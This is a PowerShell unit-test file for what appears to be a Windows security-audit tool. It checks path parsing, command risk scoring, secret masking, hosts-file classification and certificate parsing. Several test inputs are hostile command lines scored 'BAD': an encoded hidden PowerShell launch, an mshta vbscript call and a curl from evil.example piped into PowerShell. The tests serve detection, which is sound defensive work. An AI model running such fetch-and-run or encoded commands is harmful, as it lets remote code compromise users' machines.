# Модульные тесты чистых функций. Запуск: pwsh tests/Unit.ps1
. (Join-Path $PSScriptRoot '../GlowCleanWin.ps1') -LoadOnly
$fail = 0
function T($name, $got, $want) { if ("$got" -ne "$want") { $script:fail++; Write-Host "FAIL $name : got [$got] want [$want]" -ForegroundColor Red } else { Write-Host "ok   $name" } }
$env:SystemRoot = 'C:\Windows'
T 'exe quoted' (Get-ExePath '"C:\Program Files\App\a.exe" --flag') 'C:\Program Files\App\a.exe'
T 'exe unquoted spaces' (Get-ExePath 'C:\Program Files\App\a.exe /x /y') 'C:\Program Files\App\a.exe'
T 'exe ??' (Get-ExePath '\??\C:\Windows\system32\drivers\x.sys') 'C:\Windows\system32\drivers\x.sys'
T 'exe SystemRoot' (Get-ExePath '\SystemRoot\System32\drivers\x.sys') 'C:\Windows\System32\drivers\x.sys'
T 'exe system32' (Get-ExePath 'system32\DRIVERS\y.sys') 'C:\Windows\System32\DRIVERS\y.sys'
T 'exe user env' (Get-ExePath '%LOCALAPPDATA%\Discord\Update.exe --processStart Discord.exe' 'C:\Users\Tester') 'C:\Users\Tester\AppData\Local\Discord\Update.exe'
T 'exe appdata' (Get-ExePath '"%APPDATA%\x\y.exe"' 'C:\Users\Te$ter') 'C:\Users\Te$ter\AppData\Roaming\x\y.exe'
T 'exe rundll' (Get-ExePath 'C:\Windows\system32\rundll32.exe C:\x\y.dll,Entry') 'C:\Windows\system32\rundll32.exe'
T 'risk enc' (Get-CommandRisk 'powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA') 'BAD'
T 'risk mshta' (Get-CommandRisk 'mshta.exe vbscript:Execute("x")') 'BAD'
T 'risk url' (Get-CommandRisk 'cmd /c curl https://evil.example/a.ps1 | powershell') 'BAD'
T 'risk ps plain' (Get-CommandRisk 'powershell.exe -File C:\Scripts\backup.ps1') 'WARN'
T 'risk vbs' (Get-CommandRisk 'C:\Users\x\AppData\Roaming\a.vbs') 'WARN'
T 'risk normal' (Get-CommandRisk '"C:\Program Files\Steam\steam.exe" -silent') ''
T 'risk onedrive' (Get-CommandRisk '"C:\Program Files\Microsoft OneDrive\OneDrive.exe" /background') ''
T 'risk edge url' (Get-CommandRisk '"C:\Program Files\Google\Chrome\Application\chrome.exe" --app=https://x.com') ''
T 'secrets' (Hide-Secrets 'wg.exe /tunnelservice PrivateKey = aBcDeFgHiJkLmNoPqRsTuVwXyZ0123456789abcd=') 'wg.exe /tunnelservice PrivateKey = [скрыто]'
T 'priv 192' (Test-PrivateIp '192.168.1.1') 'True'
T 'priv 100.64' (Test-PrivateIp '100.100.100.100') 'True'
T 'priv pub' (Test-PrivateIp '5.45.1.2') 'False'
T 'priv 172.32' (Test-PrivateIp '172.32.0.1') 'False'
T 'writable appdata' (Test-UserWritablePath 'C:\Users\a\AppData\Roaming\x.exe') 'True'
T 'writable pf' (Test-UserWritablePath 'C:\Program Files\x\x.exe') 'False'
T 'writable root' (Test-UserWritablePath 'C:\evil.exe') 'True'
T 'fullpath' (Test-FullPath 'C:\a\b.exe') 'True'
T 'fullpath rel' (Test-FullPath 'explorer.exe') 'False'
T 'native HKLM' (ConvertTo-NativeRegPath 'HKLM:\SOFTWARE\X') 'HKEY_LOCAL_MACHINE\SOFTWARE\X'
T 'native PSPath' (ConvertTo-NativeRegPath 'Microsoft.PowerShell.Core\Registry::HKEY_USERS\S-1-5-21-1\Software') 'HKEY_USERS\S-1-5-21-1\Software'
T 'native Reg::' (ConvertTo-NativeRegPath 'Registry::HKEY_USERS\S-1\X') 'HKEY_USERS\S-1\X'
T 'signer text' (Get-SignerText 'Valid | Valve Corp.') 'подпись: Valve Corp.'
T 'ms signed' (Test-MsSigned 'Valid | Microsoft Windows') 'True'
T 'promo king' (Test-NameLike 'king.com.CandyCrushSaga' $script:PromoThird) 'True'
T 'promo calc' (Test-NameLike 'Microsoft.WindowsCalculator' ($script:PromoMs + $script:PromoThird)) 'False'
T 'promo MSTeams (new teams kept)' (Test-NameLike 'MSTeams' ($script:PromoMs + $script:PromoThird)) 'False'

# hosts
$h = @('# comment', '127.0.0.1 localhost', '0.0.0.0 lmlicenses.wip4.adobe.com', '0.0.0.0 update.kaspersky.com # x', '5.6.7.8 online.sberbank.ru www.sberbank.ru', '192.168.1.5 nas', '0.0.0.0 ads.example.com', '', '::1 localhost')
$e = @(Get-HostsEntries $h)
T 'hosts count' $e.Count 7
T 'hosts verdicts' (($e | ForEach-Object { Get-HostsVerdict $_ }) -join ',') 'LOCAL,LICENSE,SECURITY,REDIRECT,LOCAL,BLOCK,LOCAL'
T 'hosts lineno' ($e[3].LineNo) 5

# RU cert regex
T 'name hash ignores case and spaces' ((Get-NameHash ' Example CA ') -eq (Get-NameHash 'example ca')) 'True'
T 'secret pwd' (Hide-Secrets 'app.exe -Password Qwerty123! -Token ghp_short123 https://user:p4ss@host/x') 'app.exe -Password [скрыто] -Token [скрыто] https://[скрыто]@host/x'
T 'secret regpath kept' (Hide-Secrets 'HKEY_LOCAL_MACHINE\SOFTWARE\Run | Dead') 'HKEY_LOCAL_MACHINE\SOFTWARE\Run | Dead'
T 'dead with %' (Test-DeadTarget '%LOCALAPPDATA%\x\a.exe' 'C:\Users\adm\AppData\Local\x\a.exe' 'FILE NOT FOUND') 'False'
T 'dead windowsapps' (Test-DeadTarget 'C:\Program Files\WindowsApps\x\a.exe' 'C:\Program Files\WindowsApps\x\a.exe' 'FILE NOT FOUND') 'False'
T 'blob huge len' ($null -eq (ConvertFrom-CertBlob ([byte[]](32,0,0,0,1,0,0,0,255,255,255,255,1,2,3)))) 'True'
T 'known ms' ('CN=Microsoft Root Certificate Authority 2011, O=Microsoft Corporation, L=Redmond, S=Washington, C=US' -match $script:KnownRootRx) 'True'
T 'known unknown' ('CN=NVIDIA GameStream Server' -match $script:KnownRootRx) 'False'
T 'remote autodesk' ('Autodesk Fusion' -match $script:RemoteToolsRx) 'False'
T 'remote anydesk' ('AnyDesk' -match $script:RemoteToolsRx) 'True'
T 'remote material' ('Material Maker' -match $script:RemoteToolsRx) 'False'

# cert blob round trip: build a self-signed cert, wrap as registry blob with a property before it
$rsa = [System.Security.Cryptography.RSA]::Create(2048)
$req = [System.Security.Cryptography.X509Certificates.CertificateRequest]::new('CN=Example Interception Root CA, O=Example Org', $rsa, 'SHA256', [System.Security.Cryptography.RSASignaturePadding]::Pkcs1)
$cert = $req.CreateSelfSigned([DateTimeOffset]::Now, [DateTimeOffset]::Now.AddYears(1))
$der = $cert.RawData
$ms = New-Object IO.MemoryStream
function W([uint32]$id, [byte[]]$data) { $ms.Write([BitConverter]::GetBytes($id), 0, 4); $ms.Write([BitConverter]::GetBytes([uint32]1), 0, 4); $ms.Write([BitConverter]::GetBytes([uint32]$data.Length), 0, 4); $ms.Write($data, 0, $data.Length) }
W 3 ([byte[]](1..20)); W 20 ([byte[]](1..20)); W 32 $der; W 11 ([byte[]](1..6))
$c2 = ConvertFrom-CertBlob $ms.ToArray()
T 'blob thumb' $c2.Thumbprint $cert.Thumbprint
T 'outside-program: name not on the list' (Test-OutsideProgramCa $c2) 'False'
$script:OutsideProgramCa += Get-NameHash 'Example Interception Root CA'
T 'outside-program: name on the list' (Test-OutsideProgramCa $c2) 'True'
T 'der: CN found in raw bytes' ((Get-DerCommonNames ([Text.Encoding]::GetEncoding(28591).GetString($der))) -contains 'Example Interception Root CA') 'True'
T 'blob garbage' ($null -eq (ConvertFrom-CertBlob ([byte[]](1..50)))) 'True'
"subject format: $($c2.Subject)"

# selection
$script:Findings = New-Object System.Collections.ArrayList
$fx = { param($f) 'x' }
Add-Finding -Level BAD -Title 'b1' -Fix $fx
Add-Finding -Level WARN -Title 'w1' -Fix $fx
Add-Finding -Level BAD -Title 'b2 explicit' -Fix $fx -Explicit
Add-Finding -Level WARN -Title 'w2 explicit' -Fix $fx -Explicit
Add-Finding -Level BAD -Title 'b3 manual' -Manual 'm'
Add-Finding -Level OK -Title 'ok'
Set-FindingNumbers
T 'numbers' (($script:Findings | ForEach-Object { $_.Num }) -join ',') '1,3,2,4,0,0'
T 'sel YES' ((Resolve-Selection 'yes' $script:Findings | ForEach-Object { $_.Title }) -join ',') 'b1'
T 'sel ALL' ((Resolve-Selection 'all' $script:Findings | ForEach-Object { $_.Title }) -join ',') 'b1,w1'
T 'sel nums' ((Resolve-Selection '2, 4' $script:Findings | ForEach-Object { $_.Title }) -join ',') 'b2 explicit,w2 explicit'
T 'sel range' ((Resolve-Selection '1-3' $script:Findings | ForEach-Object { $_.Title }) -join ',') 'b1,b2 explicit,w1'
T 'sel not all' (@(Resolve-Selection 'not all' $script:Findings).Count) 0
T 'sel yes please' (@(Resolve-Selection 'yes please' $script:Findings).Count) 0
T 'sel YES+num' ((Resolve-Selection 'YES #4' $script:Findings | ForEach-Object { $_.Title }) -join ',') 'b1,w2 explicit'
T 'sel empty' (@(Resolve-Selection '' $script:Findings).Count) 0
T 'sel no' (@(Resolve-Selection 'no' $script:Findings).Count) 0
T 'sel да' ((Resolve-Selection 'да' $script:Findings | ForEach-Object { $_.Title }) -join ',') 'b1'
# ignore list
$script:IgnoreList = @('tailscale')
Add-Finding -Level WARN -Title 'Установлены программы удалённого доступа: Tailscale' -Fix $fx
T 'ignore' ($script:Findings[-1].Level + '|' + [bool]$script:Findings[-1].Fix) 'INFO|False'
# unquoted path without extension, resolved against real files
$d = Join-Path ([IO.Path]::GetTempPath()) 'pc check dir'; New-Item -ItemType Directory -Path $d -Force | Out-Null
Set-Content (Join-Path $d 'service') 'x'; Set-Content (Join-Path $d 'tool.exe') 'x'
T 'exe noext' (Get-ExePath "$d/service --run now") "$d/service"
T 'exe implied .exe' (Get-ExePath "$d/tool /x") "$d/tool.exe"
T 'exe fallback' (Get-ExePath 'C:\Nope dir\svc --run') 'C:\Nope'
"FAILED: $fail"
if ($fail) { exit 1 }
